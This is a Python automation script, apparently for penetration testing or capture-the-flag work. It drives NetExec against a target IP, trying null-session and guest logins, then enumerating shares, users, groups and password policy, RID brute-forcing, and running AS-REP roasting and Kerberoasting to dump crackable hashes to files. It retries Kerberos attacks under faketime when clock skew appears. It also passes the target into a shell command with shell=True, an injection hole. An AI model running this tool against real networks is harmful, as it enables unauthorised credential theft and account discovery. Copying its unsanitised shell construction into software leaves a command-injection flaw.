#!/usr/bin/env python3
import subprocess
import sys
import argparse
import shutil

# --- Module and Attack Configurations ---
# Removed empty string ("") since base command is now tested separately
ENUM_FLAGS = {
    "smb": ["--shares", "--users", "--groups", "--pass-pol", "--rid-brute"],
    "wmi": [],  # WMI has limited enumeration flags in current NXC
    "winrm": [],  # WinRM groups/sessions moved to other protocols
    "mssql": [],  # Most MSSQL flags require auth; -M mssql_priv needs valid login
    "ldap": [
        "--trusted-for-delegation", 
        "--password-not-required", 
        "--users",
        "--asreproast hashes_asrep.txt",
        "--kerberoasting hashes_kerb.txt"
    ],
    "ssh": [], "rdp": [], "vnc": [], "ftp": []
}

# Flags that require Kerberos and may fail due to clock skew
KERBEROS_FLAGS = ["--asreproast", "--kerberoasting"]

def get_target_time(target):
    """Get time from target using ntpdate for clock skew fix."""
    try:
        result = subprocess.run(
            ["ntpdate", "-q", target],
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode == 0 and result.stdout:
            # Parse first line to get time: "server 10.x.x.x, stratum 3, offset -0.001234, delay 0.02345"
            # Or format: "08 Jun 15:30:45 ntpdate[1234]: adjust time server..."
            first_line = result.stdout.strip().split('\n')[0]
            # Extract date/time from ntpdate output
            parts = first_line.split()
            if len(parts) >= 2:
                # Format: "2 Mar 14:30:45" or similar
                return f"{parts[0]} {parts[1]} {parts[2]}" if len(parts) >= 3 else None
    except Exception as e:
        print(f"\033[1;33m[!] Could not get target time: {e}\033[0m")
    return None

def run_and_stream(cmd, file_handle, use_faketime=False, target=None):
    """Execute command, print to terminal and write to file in real time.
       Returns full output as string for later analysis."""
    
    # If using faketime, wrap the command
    if use_faketime and target and shutil.which("faketime") and shutil.which("ntpdate"):
        # Build faketime command using shell to get target time dynamically
        nxc_cmd_str = " ".join(f"'{c}'" if ' ' in c or '!' in c or '&' in c else c for c in cmd)
        shell_cmd = f'faketime "$(ntpdate -q {target} 2>/dev/null | head -n1 | cut -d \' \' -f 1,2)" {nxc_cmd_str}'
        print(f"\n\033[1;35m[*] Retrying with faketime (clock sync):\033[0m")
        print(f"\033[1;34m[*] Executing:\033[0m {shell_cmd}")
        file_handle.write(f"### Command (with faketime): `{shell_cmd}`\n\n```bash\n")
        file_handle.flush()
        
        full_output = ""
        try:
            process = subprocess.Popen(
                shell_cmd,
                shell=True,
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                text=True, 
                bufsize=1
            )
            for line in process.stdout:
                print(line, end="")
                file_handle.write(line)
                file_handle.flush()
                full_output += line
            process.wait()
        except Exception as e:
            error_msg = f"Execution ERROR: {str(e)}\n"
            print(f"\033[1;31m{error_msg}\033[0m")
            file_handle.write(error_msg)
            full_output += error_msg
        
        file_handle.write("```\n\n---\n\n")
        file_handle.flush()
        return full_output
    
    # Normal execution
    cmd_str = " ".join(cmd)
    print(f"\n\033[1;34m[*] Executing:\033[0m {cmd_str}")
    
    file_handle.write(f"### Command: `{cmd_str}`\n\n```bash\n")
    file_handle.flush()

    full_output = ""
    try:
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, 
            text=True, 
            bufsize=1
        )

        for line in process.stdout:
            print(line, end="")          
            file_handle.write(line)     
            file_handle.flush()
            full_output += line

        process.wait()
    except Exception as e:
        error_msg = f"Execution ERROR: {str(e)}\n"
        print(f"\033[1;31m{error_msg}\033[0m")
        file_handle.write(error_msg)
        full_output += error_msg
    
    file_handle.write("```\n\n---\n\n")
    file_handle.flush()
    return full_output

def is_kerberos_flag(flag):
    """Check if flag requires Kerberos authentication."""
    return any(kf in flag for kf in KERBEROS_FLAGS)

def has_clock_skew_error(output):
    """Check if output contains clock skew error."""
    return "clock skew too great" in output.lower() or "krb_ap_err_skew" in output.lower()

def check_responsiveness(output, require_auth):
    """
    Analyze NetExec output to decide whether to continue with flags.
    Returns (Boolean, Reason Message).
    """
    out_lower = output.lower()
    
    # 1. Check if service is down, port is closed or unreachable
    if "connection refused" in out_lower or "timeout" in out_lower or "unreachable" in out_lower:
        return False, "Service down or port closed."
    
    # 2. Check for explicit failures
    if "[-]" in output and ("logon_failure" in out_lower or "status_logon_failure" in out_lower):
        return False, "Authentication failed."
    
    if "[-]" in output and "access_denied" in out_lower:
        return False, "Access denied."

    # 3. Check for success indicators
    # NetExec uses [+] for login success or Pwn3d! for admin
    if "[+]" in output or "Pwn3d!" in output:
        return True, "Authentication successful."
    
    # 4. For null/guest, [*] with target info means service is responsive
    # Check if we got basic info (indicates service responded)
    if "[*]" in output and ("name:" in out_lower or "domain:" in out_lower):
        return True, "Service responsive."
            
    return False, "No valid response from service."

def main():
    parser = argparse.ArgumentParser(description="NXC Automation - Smart Check & Roasting")
    parser.add_argument("protocol_or_target", help="Protocol (e.g., smb) or Target IP (Full Check)")
    parser.add_argument("target_optional", nargs='?', help="Target IP (if protocol was specified)")
    parser.add_argument("-u", "--user", help="Target user")
    parser.add_argument("-p", "--password", help="User password")

    args = parser.parse_args()

    # Define whether we test only 1 protocol or all
    if args.protocol_or_target in ENUM_FLAGS:
        protocolos = [args.protocol_or_target]
        target = args.target_optional
    else:
        protocolos = list(ENUM_FLAGS.keys())
        target = args.protocol_or_target

    if not target or target.startswith("-"):
        print("\n[!] ERROR: Target not specified. Example: ./nxc-auto.py 10.10.11.1 -u user -p pass")
        sys.exit(1)

    report_name = f"nxc_report_{target.replace('.', '_')}.md"
    require_auth = args.user is not None
    
    # Define auth modes to try when no credentials provided
    if require_auth:
        auth_modes = [(args.user, args.password, "Authenticated")]
    else:
        # Try null session first, then guest
        auth_modes = [
            ("", "", "Null Session"),
            ("guest", "", "Guest")
        ]
    
    with open(report_name, "w") as f:
        f.write(f"# NXC Smart Report - Target: {target}\n\n")
        
        for proto in protocolos:
            print(f"\n\033[1;32m[{"="*40}]\033[0m")
            print(f"\033[1;32m[>>>] Starting protocol: {proto.upper()}\033[0m")
            f.write(f"## Protocol: {proto.upper()}\n\n")
            
            # ---------------------------------------------------------
            # PHASE 1: Base Check (Connectivity and Authentication Test)
            # ---------------------------------------------------------
            working_auth = None
            
            for auth_user, auth_pass, auth_label in auth_modes:
                base_cmd = ["nxc", proto, target, "-u", auth_user, "-p", auth_pass]
                
                print(f"\033[1;33m[*] Phase 1: Testing {auth_label} access...\033[0m")
                output = run_and_stream(base_cmd, f)
                
                # Response analysis
                should_continue, reason = check_responsiveness(output, require_auth)
                
                if should_continue:
                    working_auth = (auth_user, auth_pass, auth_label)
                    print(f"\033[1;32m[+] {auth_label}: {reason}\033[0m")
                    break
                else:
                    print(f"\033[1;31m[!] {auth_label}: {reason}\033[0m")
                    f.write(f"> ⚠️ **{auth_label}:** {reason}\n\n")
            
            if not working_auth:
                print(f"\033[1;31m[!] No working auth method. Skipping deep enumeration of {proto.upper()}.\033[0m")
                f.write(f"> 🛑 **Warning:** No authentication method worked. Advanced flags were skipped.\n\n---\n\n")
                continue # Skip to next protocol
            
            auth_user, auth_pass, auth_label = working_auth
            base_cmd = ["nxc", proto, target, "-u", auth_user, "-p", auth_pass]
            
            # ---------------------------------------------------------
            # PHASE 2: Deep Enumeration and Attacks (If Phase 1 passed)
            # ---------------------------------------------------------
            print(f"\033[1;32m[+] Using {auth_label} for data extraction...\033[0m")
            for flag in ENUM_FLAGS[proto]:
                cmd = base_cmd.copy()
                cmd.extend(flag.split())
                output = run_and_stream(cmd, f)
                
                # If Kerberos flag failed due to clock skew, retry with faketime
                if is_kerberos_flag(flag) and has_clock_skew_error(output):
                    print(f"\033[1;33m[!] Clock skew detected. Attempting time sync...\033[0m")
                    f.write("> ⚠️ **Clock skew detected.** Retrying with faketime...\n\n")
                    run_and_stream(cmd, f, use_faketime=True, target=target)

    print(f"\n\033[1;32m[+] Process finished successfully! Log: {report_name}\033[0m")

if __name__ == "__main__":
    main()